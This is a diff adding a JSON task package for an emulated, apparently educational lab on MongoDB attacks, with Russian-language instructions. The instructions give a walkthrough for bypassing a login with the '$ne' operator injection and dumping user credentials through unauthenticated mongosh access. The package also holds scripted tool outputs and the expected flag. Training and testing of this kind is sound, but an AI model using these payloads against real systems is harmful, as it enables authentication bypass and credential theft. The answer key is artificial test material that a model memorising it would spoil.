@@ -1,0 +1,58 @@
+{
+  "id": "db-mongodb",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{m0ng0_0p3r4t0r_1nj3ct10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: MongoDB на shop.local\n\nТочка входа — `POST http://shop.local/api/login` (JSON `{\"username\",\"password\"}`).\n\n1. База: `curl -s -X POST http://shop.local/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'` → `invalid credentials`.\n2. Обход: пришли пароль **объектом**: `-d '{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}'` → `{\"user\":{\"role\":\"admin\"}}`.\n3. Фингерпринт: `curl -s http://shop.local/api/items` — ищи `ObjectId`.\n4. Дамп напрямую: `mongosh \"mongodb://shop.local:27017\" --eval 'db.getMongo().getDBNames()'`.\n5. Учётки: `mongosh \"mongodb://shop.local:27017/shop\" --eval 'db.users.find({},{username:1,password:1}).toArray()'`.\n6. Флаг: `... | grep 'nto' > found.txt`, затем `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api)",
+      "cases": [
+        {
+          "match": "\\$ne|\\$where|\\$gt|\\$regex",
+          "example": "-s -X POST http://shop.local/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}'",
+          "output": "{\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.4rQ\",\"user\":{\"role\":\"admin\"}}\n"
+        },
+        {
+          "match": "api/items",
+          "example": "-s http://shop.local/api/items",
+          "output": "[{\"_id\":\"6512f3a9c2b4e5d6f7a8b9c0\",\"name\":\"Laptop\"},{\"_id\":\"6512f3aac2b4e5d6f7a8b9c1\",\"name\":\"Monitor\"}]\n"
+        },
+        {
+          "match": "api/login",
+          "example": "-s -X POST http://shop.local/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
+          "output": "{\"error\":\"invalid credentials\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/api (login, items).\n"
+    },
+    "mongosh": {
+      "help": "mongosh <uri> --eval '<js>' — клиент MongoDB",
+      "cases": [
+        {
+          "match": "getDBNames",
+          "example": "mongodb://shop.local:27017 --eval 'db.getMongo().getDBNames()'",
+          "output": "[ 'admin', 'shop', 'users' ]\n"
+        },
+        {
+          "match": "db\\.users\\.find",
+          "example": "mongodb://shop.local:27017/shop --eval 'db.users.find({},{username:1,password:1}).toArray()'",
+          "output": "[\n  {\n    _id: ObjectId(\"6512f3a9c2b4e5d6f7a8b9c0\"),\n    username: 'admin',\n    password: 'nto{m0ng0_0p3r4t0r_1nj3ct10n}'\n  },\n  {\n    _id: ObjectId(\"6512f3aac2b4e5d6f7a8b9c1\"),\n    username: 'root',\n    password: '$2b$10$...'\n  }\n]\n"
+        }
+      ],
+      "fallback": "mongosh: в этой лабе доступны getDBNames и db.users.find.\n"
+    }
+  }
+}
